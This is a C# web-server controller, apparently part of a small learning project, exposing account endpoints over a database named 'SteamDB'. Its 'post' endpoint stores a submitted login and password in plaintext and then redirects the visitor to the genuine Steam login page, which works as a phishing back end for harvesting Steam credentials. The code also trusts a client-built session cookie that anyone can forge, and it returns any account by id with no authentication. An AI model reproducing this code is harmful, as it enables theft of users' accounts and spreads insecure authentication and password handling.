using WebServer.Attributes;
using System.Data.SqlClient;
using System.Net;

namespace WebServer.Controllers
{
    [ApiController]
    public class Accounts
    {
        private readonly IAccountRepository _db = 
            new AccountRepository(@"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=SteamDB;Integrated Security=True;");

        [HttpGET("list")]
        public List<Account> GetAccounts(HttpListenerRequest request, HttpListenerResponse response)
        {
            var cookie = request.Cookies["SessionId"];
            if (cookie is not null && cookie.Value.Contains("IsAuthorize: true"))
                return _db.Query(new AccountSpecification());
            else
            {
                response.StatusCode = 401;
                return null;
            }
        }

        [HttpGET("item")]
        public Account GetAccountById(int id)
        {
            return _db.Query(new AccountSpecificationById(id)).FirstOrDefault();
        }

        [HttpGET("info")]
        public Account GetAccountInfo(HttpListenerRequest request, HttpListenerResponse response)
        {
            var cookie = request.Cookies["SessionId"];
            if (cookie is not null && cookie.Value.Contains("IsAuthorize=true"))
            {
                var id = int.Parse(cookie.Value.Split("Id=")[1].Split("}")[0]);
                var result= _db.Query(new AccountSpecificationById(id)).FirstOrDefault();
                if (result != null)
                    return result;
            }
            response.StatusCode = 401;
            return null;
            
        }

        [HttpPOST("post")]
        public void SaveAccounts(string login, string password, HttpListenerResponse response)
        {
            _db.InsertAccount(new Account() { Login = login, Password = password });
            response.Redirect("https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header");
        }

        [HttpPOST("login")]
        public bool Login(string login, string password, HttpListenerResponse response)
        {
            var account = _db.Query(new AccountSpecificationByLoginPassword(login, password));
            if (account.Count() > 0)
            {
                response.Headers.Set("Set-Cookie", "SessionId={IsAuthorize=true Id="
                    + account.First().Id + "}; Path=/");
                return true;
            }
            return false;
        }
    }

    public class Account
    {
        public int Id { get; set; }
        public string Login { get; set; }
        public string Password { get; set; }
    }
}
